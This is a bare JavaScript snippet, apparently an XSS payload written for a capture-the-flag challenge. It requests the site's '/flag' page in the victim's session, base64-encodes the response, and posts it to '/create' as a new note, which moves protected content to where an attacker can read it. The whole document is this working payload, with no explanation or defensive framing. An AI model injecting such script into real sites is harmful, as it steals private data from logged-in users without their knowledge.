var req1 = new XMLHttpRequest();
req1.open("GET", "/flag");
req1.onload = function() {
    var req2 = new XMLHttpRequest();
    var url = '/create';
    var params = 'title=ipsum&body=' + btoa(this.responseText);
    req2.open('POST', url, true);
    req2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    req2.onload = function () {
        console.log(this.responseText)
    }
    req2.send(params);
}
req1.send()

